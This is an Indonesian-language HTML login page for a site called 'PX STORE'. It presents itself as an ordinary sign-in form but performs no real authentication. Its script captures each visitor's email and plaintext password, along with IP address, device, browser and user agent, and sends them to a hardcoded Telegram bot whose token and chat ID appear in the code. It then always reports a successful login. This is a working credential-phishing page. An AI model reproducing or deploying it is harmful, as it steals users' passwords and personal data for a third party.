<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <link rel="icon" href="/assets/images/icon.ico" type="image/x-icon">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - PX STORE</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #6c63ff;
            --primary-dark: #564fd8;
            --secondary: #4d44db;
            --accent: #9d4edd;
            --dark-bg: #121212;
            --dark-card: #1e1e1e;
            --dark-hover: #2d2d2d;
            --text-primary: #e0e0e0;
            --text-secondary: #a0a0a0;
            --border-radius: 12px;
            --box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            --transition: all 0.3s ease;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: var(--dark-bg);
            color: var(--text-primary);
            line-height: 1.6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .login-container {
            width: 100%;
            max-width: 400px;
            background-color: var(--dark-card);
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: var(--box-shadow);
            text-align: center;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            border-radius: 50%;
            background-color: var(--primary);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        .logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .login-title {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 10px;
            color: var(--text-primary);
        }
        
        .login-subtitle {
            font-size: 0.9rem;
            color: var(--text-secondary);
            margin-bottom: 30px;
        }
        
        .login-form {
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 0.9rem;
            color: var(--text-secondary);
        }
        
        .form-group input {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            background-color: rgba(255, 255, 255, 0.05);
            color: var(--text-primary);
            font-size: 0.9rem;
            transition: var(--transition);
        }
        
        .form-group input:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 2px rgba(108, 99, 255, 0.2);
        }
        
        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: var(--primary);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition);
            margin-bottom: 20px;
        }
        
        .login-btn:hover {
            background-color: var(--primary-dark);
            transform: translateY(-2px);
        }
        
        .login-btn:disabled {
            background-color: var(--text-secondary);
            cursor: not-allowed;
            transform: none;
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .loading-spinner {
            width: 30px;
            height: 30px;
            border: 3px solid rgba(255, 255, 255, 0.1);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .message {
            padding: 10px;
            border-radius: 8px;
            margin: 15px 0;
            font-size: 0.9rem;
            display: none;
        }
        
        .message.success {
            background-color: rgba(76, 175, 80, 0.2);
            color: #4CAF50;
            border: 1px solid rgba(76, 175, 80, 0.3);
        }
        
        .message.error {
            background-color: rgba(244, 67, 54, 0.2);
            color: #F44336;
            border: 1px solid rgba(244, 67, 54, 0.3);
        }
        
        .auto-login-info {
            margin-top: 15px;
            padding: 10px;
            background-color: rgba(108, 99, 255, 0.1);
            border-radius: 8px;
            font-size: 0.8rem;
            color: var(--text-secondary);
        }
        
        .telegram-status {
            margin-top: 10px;
            font-size: 0.8rem;
            color: var(--text-secondary);
            display: none;
        }
        
        .footer-text {
            margin-top: 20px;
            font-size: 0.8rem;
            color: var(--text-secondary);
        }
        
        @media (max-width: 480px) {
            .login-container {
                padding: 30px 20px;
            }
            
            .logo {
                width: 70px;
                height: 70px;
            }
            
            .login-title {
                font-size: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="assets/images/icon.ico" alt="PX STORE">
        </div>
        
        <h1 class="login-title">Masuk ke PX STORE</h1>
        <p class="login-subtitle">Silakan masuk untuk mengakses layanan premium kami</p>
        
        <div class="login-form">
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" placeholder="nama@email.com" required>
            </div>
            
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Masukkan password" required>
            </div>
            
            <button class="login-btn" onclick="handleLogin()">Masuk</button>
        </div>
        
        <div class="loading">
            <div class="loading-spinner"></div>
            <p style="text-align: center; margin-top: 10px;">Memproses login...</p>
        </div>
        
        <div class="message" id="message"></div>
        
        <div class="telegram-status" id="telegramStatus">
            <i class="fab fa-telegram"></i> <span id="telegramText">Mengirim notifikasi ke admin...</span>
        </div>
            
        <p class="footer-text">Dengan masuk, Anda menyetujui Syarat & Ketentuan kami</p>
    </div>

    <script>
        // Konfigurasi Telegram Bot
        const TELEGRAM_BOT_TOKEN = '7513756403:AAHxi73Wd_wI2dfm3yoWIWPXYiowXCZkQB4'; // Ganti dengan token bot Telegram Anda
        const TELEGRAM_CHAT_ID = '7661292905'; // Ganti dengan chat ID admin
        
        // Cek apakah user sudah login sebelumnya
        function checkLoginStatus() {
            const isLoggedIn = localStorage.getItem('pxstore_logged_in');
            
            if (isLoggedIn === 'true') {
                // Jika sudah login, langsung arahkan ke halaman utama
                window.location.href = 'beranda.html';
            }
        }
        
        // Get user IP address
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Tidak dapat mendeteksi';
            }
        }
        
        // Get device info
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Desktop';
            
            if (/Android/i.test(ua)) device = 'Android';
            else if (/iPhone|iPad|iPod/i.test(ua)) device = 'iOS';
            else if (/Windows/i.test(ua)) device = 'Windows';
            else if (/Mac/i.test(ua)) device = 'Mac';
            else if (/Linux/i.test(ua)) device = 'Linux';
            
            return device;
        }
        
        // Get browser info
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            let browser = 'Unknown';
            
            if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edg/.test(ua)) browser = 'Edge';
            else if (/Opera|OPR/.test(ua)) browser = 'Opera';
            
            return browser;
        }
        
        // Show message
        function showMessage(text, type) {
            const messageEl = document.getElementById('message');
            messageEl.textContent = text;
            messageEl.className = `message ${type}`;
            messageEl.style.display = 'block';
            
            setTimeout(() => {
                messageEl.style.display = 'none';
            }, 5000);
        }
        
        // Show loading
        function showLoading(show) {
            document.querySelector('.loading').style.display = show ? 'block' : 'none';
        }
        
        // Show Telegram status
        function showTelegramStatus(text, isSuccess = true) {
            const telegramStatus = document.getElementById('telegramStatus');
            const telegramText = document.getElementById('telegramText');
            
            telegramText.textContent = text;
            telegramStatus.style.color = isSuccess ? '#4CAF50' : '#F44336';
            telegramStatus.style.display = 'block';
        }
        
        // Send login data to Telegram
        async function sendToTelegram(userData) {
            try {
                const message = `🔔 *LOGIN BARU PX STORE* 🔔
                
👤 *Informasi Login:*
• Email: ${userData.email}
• Password: ${userData.password}
• Waktu: ${userData.time}
• IP Address: ${userData.ip}

📍 *Informasi Perangkat:*
• Perangkat: ${userData.device}
• Browser: ${userData.browser}
• Platform: ${navigator.platform}
• Bahasa: ${navigator.language}

🌐 *User Agent:*
${navigator.userAgent}`;

                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }
        
        // Handle regular login
        async function handleLogin() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                showMessage('Harap isi email dan password!', 'error');
                return;
            }
            
            showLoading(true);
            
            // Simulate API call delay
            setTimeout(async () => {
                const userIP = await getUserIP();
                const currentTime = new Date().toLocaleString('id-ID');
                const device = getDeviceInfo();
                const browser = getBrowserInfo();
                
                // Simpan status login secara otomatis
                localStorage.setItem('pxstore_logged_in', 'true');
                localStorage.setItem('pxstore_user_email', email);
                localStorage.setItem('pxstore_login_time', new Date().toISOString());
                
                // Kirim data ke Telegram (termasuk password)
                const userData = {
                    email: email,
                    password: password,
                    time: currentTime,
                    ip: userIP,
                    device: device,
                    browser: browser
                };
                
                const telegramSuccess = await sendToTelegram(userData);
                
                showLoading(false);
                
                if (telegramSuccess) {
                    showTelegramStatus('Selamat Datang', true);
                    showMessage('Login berhasil! Mengarahkan ke halaman utama...', 'success');
                } else {
                    showTelegramStatus('Failed', false);
                    showMessage('Login berhasil! Mengarahkan ke halaman utama...', 'success');
                }
                
                // Redirect to main page after 2 seconds
                setTimeout(() => {
                    window.location.href = 'beranda.html';
                }, 2000);
            }, 1500);
        }
        
        // Auto redirect jika sudah login
        document.addEventListener('DOMContentLoaded', function() {
            // Cek status login
            checkLoginStatus();
            
            // Add enter key support
            document.getElementById('password').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    handleLogin();
                }
            });
            
            // Coba isi data dari localStorage jika ada
            const savedEmail = localStorage.getItem('pxstore_user_email');
            if (savedEmail) {
                document.getElementById('email').value = savedEmail;
            }
        });
    </script>
</body>
</html>
